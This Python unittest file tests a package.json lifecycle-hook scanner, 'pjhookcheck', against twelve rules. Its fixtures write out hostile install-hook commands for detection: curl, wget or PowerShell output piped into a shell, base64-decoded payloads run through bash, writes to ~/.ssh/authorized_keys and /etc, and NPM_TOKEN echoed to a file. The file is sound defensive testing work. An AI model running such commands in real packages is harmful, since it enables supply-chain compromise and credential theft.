"""Per-rule positive + negative tests.

For every rule we test at least one fixture that fires it and at least
one that does not - so a regression that mutes a rule flips the negative
test, and a regression that widens a rule flips the positive test.
"""

import unittest

from pjhookcheck.rules import REGISTRY, REGISTRY_BY_ID, run_all, all_rule_ids
from pjhookcheck.types import Options, Severity

from tests.support import make_hs_token, scan_dict, rule_ids


BASE_HEALTHY = {
    "name": "healthy",
    "version": "1.0.0",
    "packageManager": "pnpm@9.1.4",
    "scripts": {"build": "tsc", "test": "node --test"},
    "dependencies": {"chalk": "5.3.0"},
}


def _hook(name, cmd, extra=None):
    doc = dict(BASE_HEALTHY)
    doc["scripts"] = {**BASE_HEALTHY["scripts"], name: cmd}
    if extra:
        doc.update(extra)
    return doc


def _dep(section, name, spec, extra=None):
    doc = {k: (dict(v) if isinstance(v, dict) else v) for k, v in BASE_HEALTHY.items()}
    doc.setdefault(section, {})[name] = spec
    if extra:
        doc.update(extra)
    return doc


class RegistryInvariants(unittest.TestCase):
    def test_count_is_twelve(self):
        self.assertEqual(len(REGISTRY), 12)

    def test_ids_are_unique(self):
        ids = [r.id for r in REGISTRY]
        self.assertEqual(len(ids), len(set(ids)))

    def test_ids_are_canonical(self):
        for r in REGISTRY:
            self.assertRegex(r.id, r"^PJH-\d{3}$")

    def test_descriptions_non_empty(self):
        for r in REGISTRY:
            self.assertTrue(r.description.strip())

    def test_valid_severity(self):
        for r in REGISTRY:
            self.assertIn(r.severity, {Severity.HIGH, Severity.MEDIUM, Severity.INFO})

    def test_severity_split(self):
        counts = {Severity.HIGH: 0, Severity.MEDIUM: 0, Severity.INFO: 0}
        for r in REGISTRY:
            counts[r.severity] += 1
        # 6 HIGH, 5 MEDIUM, 1 INFO
        self.assertEqual(counts[Severity.HIGH], 6)
        self.assertEqual(counts[Severity.MEDIUM], 5)
        self.assertEqual(counts[Severity.INFO], 1)

    def test_check_callable(self):
        for r in REGISTRY:
            self.assertTrue(callable(r.check))

    def test_healthy_fires_only_info(self):
        _err, findings = scan_dict(BASE_HEALTHY)
        # Every finding must be INFO or nothing (this fixture is clean).
        for f in findings:
            self.assertIs(f.severity, Severity.INFO)

    def test_empty_dict_fires_only_packagemanager_info(self):
        _err, findings = scan_dict({})
        ids = [f.rule_id for f in findings]
        self.assertEqual(ids, ["PJH-012"])

    def test_run_all_swallows_disabled(self):
        doc = _hook("preinstall", "curl x | sh")
        _err, findings = scan_dict(doc, options=Options(disabled=frozenset({"PJH-001"})))
        self.assertNotIn("PJH-001", rule_ids(findings))

    def test_all_rule_ids_matches_registry(self):
        self.assertEqual(all_rule_ids(), tuple(r.id for r in REGISTRY))


class Rule001FetchExec(unittest.TestCase):
    def test_curl_pipe_sh(self):
        _err, f = scan_dict(_hook("preinstall", "curl -fsSL https://a.example/x.sh | sh"))
        self.assertIn("PJH-001", rule_ids(f))

    def test_wget_pipe_bash(self):
        _err, f = scan_dict(_hook("postinstall", "wget -qO- https://a.example/x | bash"))
        self.assertIn("PJH-001", rule_ids(f))

    def test_iwr_pipe_iex_powershell(self):
        _err, f = scan_dict(_hook("install", "iwr https://a.example/x.ps1 | iex"))
        self.assertIn("PJH-001", rule_ids(f))

    def test_invoke_webrequest_pipe(self):
        _err, f = scan_dict(_hook("install",
                                  "Invoke-WebRequest https://a.example | Invoke-Expression"))
        self.assertIn("PJH-001", rule_ids(f))

    def test_plain_curl_no_fire(self):
        _err, f = scan_dict(_hook("test", "curl https://a.example/data > out.json"))
        self.assertNotIn("PJH-001", rule_ids(f))

    def test_non_hook_command_no_fire(self):
        # `test` is not a lifecycle hook.
        doc = dict(BASE_HEALTHY)
        doc["scripts"] = {"test": "curl x | sh"}
        _err, f = scan_dict(doc)
        self.assertNotIn("PJH-001", rule_ids(f))


class Rule002InlineEval(unittest.TestCase):
    def test_node_e(self):
        _err, f = scan_dict(_hook("install",
                                  "node -e \"console.log(require('os').hostname())\""))
        self.assertIn("PJH-002", rule_ids(f))

    def test_python_c(self):
        _err, f = scan_dict(_hook("preinstall", "python -c 'import sys;print(1)'"))
        self.assertIn("PJH-002", rule_ids(f))

    def test_bash_c(self):
        _err, f = scan_dict(_hook("postinstall", "bash -c 'exit 0'"))
        self.assertIn("PJH-002", rule_ids(f))

    def test_no_fire_for_plain_node(self):
        _err, f = scan_dict(_hook("install", "node ./build.js"))
        self.assertNotIn("PJH-002", rule_ids(f))

    def test_no_fire_for_test_script(self):
        doc = dict(BASE_HEALTHY)
        doc["scripts"] = {"test": "node -e 'process.exit(0)'"}
        _err, f = scan_dict(doc)
        self.assertNotIn("PJH-002", rule_ids(f))

    def test_suppressed_when_001_fires(self):
        _err, f = scan_dict(_hook("install",
                                  "curl x | bash -c 'exit 0'"))
        ids = rule_ids(f)
        self.assertIn("PJH-001", ids)
        self.assertNotIn("PJH-002", ids)


class Rule003DecodeExec(unittest.TestCase):
    def test_base64_pipe_bash(self):
        _err, f = scan_dict(_hook("postinstall",
                                  "echo aGVsbG9oZWxsb2hlbGxvaGVsbG9oZWxsb2hlbGxvaGVsbG8= | base64 -d | bash"))
        self.assertIn("PJH-003", rule_ids(f))

    def test_buffer_from_base64(self):
        payload = "Buffer.from('aGVsbG9oZWxsb2hlbGxvaGVsbG9oZWxsb2hlbGxv','base64').toString()"
        _err, f = scan_dict(_hook("install", "node -e \"" + payload + "\""))
        self.assertIn("PJH-003", rule_ids(f))

    def test_atob_long_blob(self):
        blob = "A" * 60
        _err, f = scan_dict(_hook("install", f"node -e \"atob('{blob}')\""))
        self.assertIn("PJH-003", rule_ids(f))

    def test_no_fire_short_base64(self):
        _err, f = scan_dict(_hook("install", "echo aGVsbG8= | base64 -d"))
        self.assertNotIn("PJH-003", rule_ids(f))


class Rule004UrlDep(unittest.TestCase):
    def test_git_https(self):
        _err, f = scan_dict(_dep("dependencies", "x", "git+https://github.com/a/b.git"))
        self.assertIn("PJH-004", rule_ids(f))

    def test_github_shorthand(self):
        _err, f = scan_dict(_dep("dependencies", "y", "github:a/b#v1"))
        self.assertIn("PJH-004", rule_ids(f))

    def test_http_tarball(self):
        _err, f = scan_dict(_dep("dependencies", "z", "https://a.example/pkg-1.0.0.tgz"))
        self.assertIn("PJH-004", rule_ids(f))

    def test_semver_no_fire(self):
        _err, f = scan_dict(_dep("dependencies", "s", "^1.2.3"))
        self.assertNotIn("PJH-004", rule_ids(f))


class Rule005FileEscape(unittest.TestCase):
    def test_dotdot_escape(self):
        _err, f = scan_dict(_dep("dependencies", "a", "file:../../outside"))
        self.assertIn("PJH-005", rule_ids(f))

    def test_absolute(self):
        _err, f = scan_dict(_dep("dependencies", "a", "file:/etc/pkg"))
        self.assertIn("PJH-005", rule_ids(f))

    def test_home(self):
        _err, f = scan_dict(_dep("dependencies", "a", "file:~/malicious"))
        self.assertIn("PJH-005", rule_ids(f))

    def test_windows_drive(self):
        _err, f = scan_dict(_dep("dependencies", "a", "file:C:/pkg"))
        self.assertIn("PJH-005", rule_ids(f))

    def test_repo_local_no_fire(self):
        _err, f = scan_dict(_dep("dependencies", "a", "file:./packages/inner"))
        self.assertNotIn("PJH-005", rule_ids(f))


class Rule006SensitivePath(unittest.TestCase):
    def test_ssh_authorized_keys(self):
        _err, f = scan_dict(_hook("postinstall",
                                  "cat mykey >> ~/.ssh/authorized_keys"))
        self.assertIn("PJH-006", rule_ids(f))

    def test_etc(self):
        _err, f = scan_dict(_hook("install", "cp x /etc/systemd/system/x.service"))
        self.assertIn("PJH-006", rule_ids(f))

    def test_zshrc(self):
        _err, f = scan_dict(_hook("prepare", "echo hi >> ~/.zshrc"))
        self.assertIn("PJH-006", rule_ids(f))

    def test_no_fire_plain_hook(self):
        _err, f = scan_dict(_hook("install", "node ./build.js"))
        self.assertNotIn("PJH-006", rule_ids(f))


class Rule007GlobalInstall(unittest.TestCase):
    def test_npm_g(self):
        _err, f = scan_dict(_hook("install", "npm i -g dangerous-cli"))
        self.assertIn("PJH-007", rule_ids(f))

    def test_yarn_global_add(self):
        _err, f = scan_dict(_hook("install", "yarn global add dangerous"))
        self.assertIn("PJH-007", rule_ids(f))

    def test_pnpm_g(self):
        _err, f = scan_dict(_hook("install", "pnpm add -g dangerous"))
        self.assertIn("PJH-007", rule_ids(f))

    def test_local_install_no_fire(self):
        _err, f = scan_dict(_hook("install", "npm install dangerous"))
        self.assertNotIn("PJH-007", rule_ids(f))


class Rule008SecretEcho(unittest.TestCase):
    def test_echo_npm_token(self):
        _err, f = scan_dict(_hook("prepublishOnly", "echo $NPM_TOKEN > /tmp/x"))
        self.assertIn("PJH-008", rule_ids(f))

    def test_printf_github_token(self):
        _err, f = scan_dict(_hook("install", "printf %s ${GITHUB_TOKEN}"))
        self.assertIn("PJH-008", rule_ids(f))

    def test_generated_secret_env_name_from_parts(self):
        # sub-16-char parts assembled at runtime so no whole secret literal
        # appears in this source file.
        token = make_hs_token()
        self.assertGreaterEqual(len(token), 40)
        _err, f = scan_dict(_hook("install",
                                  f"echo $MY_API_KEY  # token is {token}"))
        self.assertIn("PJH-008", rule_ids(f))

    def test_no_fire_when_no_echo(self):
        _err, f = scan_dict(_hook("install", "node -e 'console.log($NPM_TOKEN)'"))
        # node -e is PJH-002, but PJH-008 requires echo/printf/print.
        self.assertNotIn("PJH-008", rule_ids(f))


class Rule009UnpinnedSpec(unittest.TestCase):
    def test_latest(self):
        _err, f = scan_dict(_dep("dependencies", "a", "latest"))
        self.assertIn("PJH-009", rule_ids(f))

    def test_star(self):
        _err, f = scan_dict(_dep("dependencies", "a", "*"))
        self.assertIn("PJH-009", rule_ids(f))

    def test_x_wildcard(self):
        _err, f = scan_dict(_dep("dependencies", "a", "1.x"))
        self.assertIn("PJH-009", rule_ids(f))

    def test_unbounded_gte_zero(self):
        _err, f = scan_dict(_dep("dependencies", "a", ">=0.0.0"))
        self.assertIn("PJH-009", rule_ids(f))

    def test_pinned_no_fire(self):
        _err, f = scan_dict(_dep("dependencies", "a", "1.2.3"))
        self.assertNotIn("PJH-009", rule_ids(f))

    def test_caret_no_fire(self):
        _err, f = scan_dict(_dep("dependencies", "a", "^1.2.3"))
        self.assertNotIn("PJH-009", rule_ids(f))


class Rule010BundleDeps(unittest.TestCase):
    def test_bundle_list_fires(self):
        doc = dict(BASE_HEALTHY)
        doc["bundleDependencies"] = ["one", "two"]
        _err, f = scan_dict(doc)
        self.assertIn("PJH-010", rule_ids(f))

    def test_bundled_alias_fires(self):
        doc = dict(BASE_HEALTHY)
        doc["bundledDependencies"] = ["one"]
        _err, f = scan_dict(doc)
        self.assertIn("PJH-010", rule_ids(f))

    def test_bundle_true(self):
        doc = dict(BASE_HEALTHY)
        doc["bundleDependencies"] = True
        _err, f = scan_dict(doc)
        self.assertIn("PJH-010", rule_ids(f))

    def test_empty_list_no_fire(self):
        doc = dict(BASE_HEALTHY)
        doc["bundleDependencies"] = []
        _err, f = scan_dict(doc)
        self.assertNotIn("PJH-010", rule_ids(f))


class Rule011Obfuscation(unittest.TestCase):
    def test_hex_escape_density(self):
        payload = "".join(["\\x41"] * 8)
        _err, f = scan_dict(_hook("prepack", f"node -e \"var x='{payload}'\""))
        self.assertIn("PJH-011", rule_ids(f))

    def test_long_single_line(self):
        _err, f = scan_dict(_hook("install", "echo " + "A" * 420))
        self.assertIn("PJH-011", rule_ids(f))

    def test_no_fire_normal(self):
        _err, f = scan_dict(_hook("install", "echo hello"))
        self.assertNotIn("PJH-011", rule_ids(f))

    def test_suppressed_when_003_fires(self):
        _err, f = scan_dict(_hook("install",
                                  "echo " + "A" * 80 + " | base64 -d | sh"))
        # PJH-003 should fire and suppress PJH-011 for the same hook.
        ids = rule_ids(f)
        self.assertIn("PJH-003", ids)
        self.assertNotIn("PJH-011", ids)


class Rule012PackageManager(unittest.TestCase):
    def test_missing_fires(self):
        doc = {k: v for k, v in BASE_HEALTHY.items() if k != "packageManager"}
        _err, f = scan_dict(doc)
        self.assertIn("PJH-012", rule_ids(f))

    def test_present_no_fire(self):
        _err, f = scan_dict(BASE_HEALTHY)
        self.assertNotIn("PJH-012", rule_ids(f))


if __name__ == "__main__":
    unittest.main()
